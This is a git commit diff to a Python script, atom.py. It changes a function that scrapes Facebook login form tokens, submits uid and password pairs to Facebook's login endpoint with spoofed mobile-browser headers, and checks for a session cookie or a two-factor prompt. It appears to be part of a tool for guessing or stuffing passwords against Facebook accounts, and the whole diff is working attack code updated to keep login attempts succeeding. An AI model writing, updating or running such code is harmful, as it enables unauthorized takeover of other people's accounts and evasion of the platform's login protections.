8ab7eb6fd115bbc07b2bc0ab1f071fdbb87d411c
DESTROYED-TESTER <168154763+DESTROYED-TESTER@users.noreply.github.com>
2024-10-02 10:14:15 +0530

    Update atom.py

--- atom.py
+++ atom.py
@@ -1521,24 +1521,30 @@ def mobile(uid,pwx,tl):
             time_now = int(datetime.now().timestamp())
             enc_password = f"#PWD_BROWSER:0:{time_now}:{pw}"
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com').text
+            free_fb = Session.get('https://business.facebook.com').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
             'trynum': '1',
-            'timezone': '-360',
-            'lgndim': "",
-            'lgnrnd': "",
-            'lgnjs': "",
+            'timezone': '-330',
+            'lgndim': re.search('name="lgndim" value="(.*?)"', str(free_fb)).group(1),
+            'lgnrnd': re.search('name="lgnrnd" value="(.*?)"', str(free_fb)).group(1),
+            'lgnjs': re.search('name="lgnjs" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
-            'prefill_contact_point': uid,
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'contact_point',
-            'first_prefill_source': 'browser_dropdown',
-            'first_prefill_type': 'contact_point',
-            'had_cp_prefilled': 'true',
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
             'had_password_prefilled': 'false',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw)}
+            'ab_test_data': 'fAfAA/ff//AAAAAAAAAAAAAAfAAAAAAAAAAAAAAAAAAVVVq/VVGAAA',
+            'encpass':  "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             headers = {
             'Host': 'm.facebook.com',
             'method': 'POST',
@@ -1560,8 +1566,8 @@ def mobile(uid,pwx,tl):
             'user-agent': ua,
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'dnt': '1',
-            'origin': 'https://m.facebook.com',
-            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D274266067164%26cbt%3D1727799868676%26e2e%3D%257B%2522init%2522%253A1727799868676%257D%26ies%3D0%26sdk%3Dandroid-15.0.2%26sso%3Dchrome_custom_tab%26nonce%3Def106713-7b2d-4e64-99e3-9472dc33e4a9%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522fac9e37c-09c8-4088-966c-de4a4cfdc693%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ke3bav5vqb2rkr5941ej%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.pinterest%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DtdE1uLjyHZfqDyLNeUM50AfQug3nBXEVrhSQsAz-b4Q%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfac9e37c-09c8-4088-966c-de4a4cfdc693%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.pinterest%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522fac9e37c-09c8-4088-966c-de4a4cfdc693%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ke3bav5vqb2rkr5941ej%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
+            'origin': 'https://business.facebook.com',
+            'referer': 'https://business.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D274266067164%26cbt%3D1727799868676%26e2e%3D%257B%2522init%2522%253A1727799868676%257D%26ies%3D0%26sdk%3Dandroid-15.0.2%26sso%3Dchrome_custom_tab%26nonce%3Def106713-7b2d-4e64-99e3-9472dc33e4a9%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522fac9e37c-09c8-4088-966c-de4a4cfdc693%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ke3bav5vqb2rkr5941ej%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.pinterest%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DtdE1uLjyHZfqDyLNeUM50AfQug3nBXEVrhSQsAz-b4Q%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dfac9e37c-09c8-4088-966c-de4a4cfdc693%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.pinterest%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522fac9e37c-09c8-4088-966c-de4a4cfdc693%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522ke3bav5vqb2rkr5941ej%2522%257D&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr',
             'x-requested-with': 'mark.via.gp',
             'sec-fetch-site': 'none',
             'sec-fetch-mode': 'navigate',
@@ -1570,7 +1576,7 @@ def mobile(uid,pwx,tl):
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028"
+            url = "https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
